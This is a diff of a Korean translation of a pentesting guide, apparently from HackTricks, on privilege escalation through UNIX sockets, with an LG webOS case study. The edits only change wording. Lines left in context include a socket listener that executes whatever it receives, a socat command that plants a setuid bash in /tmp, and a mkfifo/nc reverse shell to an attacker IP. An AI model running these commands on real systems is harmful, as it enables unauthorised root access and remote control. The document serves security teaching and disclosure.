@@ -4,7 +4,7 @@
 
 ## Python을 사용한 Socket binding 예제
 
-다음 예제에서는 **unix socket이 생성되고** (`/tmp/socket_test.s`), **수신된 모든 내용**이 `os.system`에 의해 **실행됩니다**.실제 환경에서 이런 코드를 발견할 가능성은 낮지만, 이 예제의 목적은 unix socket을 사용하는 코드가 어떤 형태인지, 그리고 최악의 경우를 가정해 입력을 어떻게 처리해야 하는지 확인하는 것입니다.
+다음 예제에서는 **unix socket이 생성되고** (`/tmp/socket_test.s`) **수신된 모든 내용이** `os.system`에 의해 **실행됩니다**.실제 환경에서 이런 코드를 발견할 가능성은 낮지만, 이 예제의 목적은 unix sockets를 사용하는 코드가 어떤 형태인지 확인하고, 최악의 경우를 가정해 입력을 처리하는 방법을 살펴보는 것입니다.
 ```python:s.py
 import socket
 import os, os.path
@@ -26,7 +26,7 @@ print(datagram)
 os.system(datagram)
 conn.close()
 ```
-**Python을 사용해** 코드를 실행하세요: `python s.py` 그리고 **소켓이 어떻게 listening 중인지 확인하세요**:
+**실행**: `python s.py`를 사용하여 코드를 **실행**하고 **socket이 어떻게 listening 중인지 확인**합니다:
 ```python
 netstat -a -p --unix | grep "socket_test"
 (Not all processes could be identified, non-owned process info
@@ -37,17 +37,17 @@ unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        
 ```python
 echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
 ```
-## 사례 연구: Root-owned UNIX socket 기반 signal-triggered escalation (LG webOS)
+## 사례 연구: Root-owned UNIX socket signal-triggered escalation (LG webOS)
 
-일부 privileged daemon은 신뢰할 수 없는 입력을 수락하고 privileged action을 thread-ID 및 signal과 연결하는 root-owned UNIX socket을 노출합니다. protocol이 unprivileged client로 하여금 어떤 native thread를 대상으로 할지 제어하도록 허용한다면, privileged code path를 trigger하여 권한을 상승시킬 수 있습니다.
+일부 권한이 높은 daemon은 신뢰할 수 없는 입력을 받으며, 권한이 있는 작업을 thread-ID 및 signal과 연결하는 Root-owned UNIX socket을 노출합니다. 프로토콜에서 권한이 없는 client가 대상이 되는 native thread를 지정할 수 있다면, 권한이 있는 code path를 trigger하여 권한을 상승시킬 수 있습니다.<sup>[[1]](#references)</sup>
 
 관찰된 패턴:
-- root-owned socket(예: /tmp/remotelogger)에 연결합니다.
+- Root-owned socket(예: /tmp/remotelogger)에 연결합니다.
 - thread를 생성하고 native thread id(TID)를 가져옵니다.
-- padding과 함께 TID를 packed 형식으로 request로 전송하고 acknowledgement를 받습니다.
-- 해당 TID에 특정 signal을 전달하여 privileged behaviour를 trigger합니다.
+- TID를 packed 형태로 padding과 함께 request로 전송하고 acknowledgement를 받습니다.
+- 특정 signal을 해당 TID로 전달하여 privileged behaviour를 trigger합니다.
 
-Minimal PoC 개요:
+최소 PoC 개요:
 ```python
 import socket, struct, os, threading, time
 # Spawn a thread so we have a TID we can signal
@@ -65,11 +65,11 @@ rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
 ```
 참고:
-- 이 유형의 bug는 권한이 없는 client state(TIDs)에서 파생된 값을 신뢰하고, 이를 권한 있는 signal handler 또는 logic에 연결할 때 발생합니다.
-- socket에서 credentials를 강제하고, message format을 검증하며, 권한 있는 작업을 외부에서 제공된 thread identifier와 분리하여 harden합니다.
+- 이 유형의 버그는 권한이 없는 client state(TIDs)에서 파생된 값을 신뢰하고, 이를 권한 있는 signal handler 또는 logic에 연결할 때 발생합니다.
+- socket에서 credentials를 강제하고, message format을 검증하며, 권한 있는 작업을 외부에서 제공된 thread identifier와 분리하여 보안을 강화합니다.
 
 ## 참고 자료
 
-- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
+- [1] [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
 
 {{#include ../../banners/hacktricks-training.md}}
